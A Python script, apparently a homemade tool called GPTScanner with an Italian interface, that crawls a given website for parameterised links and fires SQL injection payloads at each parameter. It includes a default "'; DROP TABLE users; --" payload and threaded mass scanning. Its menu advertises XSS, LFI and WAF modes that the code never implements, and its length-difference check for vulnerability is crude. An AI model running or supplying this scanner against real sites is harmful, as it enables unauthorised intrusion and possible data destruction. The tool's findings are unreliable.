import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
import csv
import os
import time
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

def load_payloads(path=None):
    if path and os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    return ["'", "' OR '1'='1", "'; DROP TABLE users; --"]

def get_all_links(base_url):
    try:
        response = requests.get(base_url, timeout=10)
    except Exception as e:
        print(f"[!] Errore durante il download: {e}")
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    links = set()
    for tag in soup.find_all('a', href=True):
        full_url = urljoin(base_url, tag['href'])
        links.add(full_url)
    
    return list(links)

def filter_links_with_params(links):
    return [link for link in links if '?' in link]

def is_significantly_different(resp1, resp2):
    if not resp1 or not resp2:
        return False
    len1, len2 = len(resp1), len(resp2)
    if len1 == 0 or len2 == 0:
        return False
    diff_ratio = abs(len1 - len2) / max(len1, len2)
    return diff_ratio > 0.2

def test_single_url(link, payloads, writer=None, test_type=2):
    parsed = urlparse(link)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query)
    normal_response = None
    vulnerable_links = []

    for key in params:
        for payload in payloads:
            new_params = params.copy()
            new_params[key] = payload
            try:
                injected_url = requests.Request('GET', base, params=new_params).prepare().url
                resp_payload = requests.get(injected_url, timeout=10)

                if not normal_response:
                    normal_url = requests.Request('GET', base, params=params).prepare().url
                    normal_response = requests.get(normal_url, timeout=10)

                errors = ["sql", "syntax", "mysql", "you have an error", "warning"]
                is_vuln = any(e in resp_payload.text.lower() for e in errors) or is_significantly_different(normal_response.text, resp_payload.text)

                if is_vuln:
                    print(Fore.GREEN + f"[VULNERABILE] {injected_url}")
                    vulnerable_links.append(injected_url)
                    if writer:
                        writer.writerow(["VULNERABILE", injected_url])
                else:
                    print(Fore.RED + f"[NON VULNERABILE] {injected_url}")
                    if writer:
                        writer.writerow(["OK", injected_url])
            except Exception as e:
                print(f"[!] Errore su {injected_url}: {e}")
    return vulnerable_links

def prepare_csv(filename):
    f = open(filename, 'w', newline='', encoding='utf-8')
    writer = csv.writer(f)
    writer.writerow(["Stato", "URL testato"])
    return f, writer

def menu_interattivo():
    print("\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+")
    print("\n |G|P|T|-|S|c|a|n|n|e|r-|x|P|l|o|i|t|s|3|c|")
    print("\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+")
    
    print("\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+")
    print("\n [!] Legal disclaimer: attacking targets without prior mutual consent is illegal.")
    print("\n [!] It is the end user's responsibility to obey all applicable local, state and federal laws.")
    print("\n [!] Developers assume no liability and are not responsible for any misuse or damage caused by this program.")
    print("\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+")
    
    print("\n*** Seleziona modalità di scansione ***")
    print("1) Solo scraping dei link con parametri")
    print("2) Scraping + analisi vulnerabilità SQLi")
    print("3) Scraping + analisi vulnerabilità XSS")
    print("4) Scraping + analisi vulnerabilità LFI")
    print("5) Scraping + rilevamento WAF e IP")
    scelta = input("Scelta (1-5): ").strip()
    return int(scelta)

def main():
    parser = argparse.ArgumentParser(description='GPTScanner - Scansione automatica SQLi.')
    parser.add_argument('-o', '--output', help='Salva i risultati in un file CSV', default='risultati.csv')
    args = parser.parse_args()
    output_file = args.output
    url = input("Inserisci l'URL del sito da testare: ").strip()
    scelta = menu_interattivo()
    payloads_file = input("File payloads (opzionale, invio per default): ").strip() or None
    output_file = input("Nome file CSV output [default: risultati.csv]: ").strip() or "risultati.csv"
    thread_count = input("Numero di thread (default 5): ").strip()
    thread_count = int(thread_count) if thread_count.isdigit() else 5

    start_time = time.time()
    payloads = load_payloads(payloads_file)
    all_links = get_all_links(url)
    param_links = filter_links_with_params(all_links)

    print(f"\n[+] Trovati {len(param_links)} link con parametri:\n")
    for l in param_links:
        print("  -", l)

    if scelta == 1:
        print("\n[✓] Solo scraping completato.")
        return

    print("\n[+] Inizio test vulnerabilità...\n")
    file_csv, writer = prepare_csv(output_file)

    total_vulnerabili = 0
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = {executor.submit(test_single_url, link, payloads, writer, scelta): link for link in param_links}
        with tqdm(total=len(param_links), desc='Scanning') as pbar:
            for future in as_completed(futures):
                result = future.result()
                for r in result:
                    writer.writerow([r, 'SI'])
                if not result:
                    writer.writerow(['Nessuna vulnerabilità rilevata', 'NO'])
                total_vulnerabili += len(result)
                pbar.update(1)

    file_csv.close()
    print(f"\n[✓] Scan completato in {round(time.time() - start_time, 2)}s")
    print(f"[✓] Vulnerabilità trovate: {Fore.GREEN + str(total_vulnerabili) if total_vulnerabili else Fore.RED + '0'}")
    print(f"[✓] Report salvato in: {output_file}")

if __name__ == "__main__":
    main()
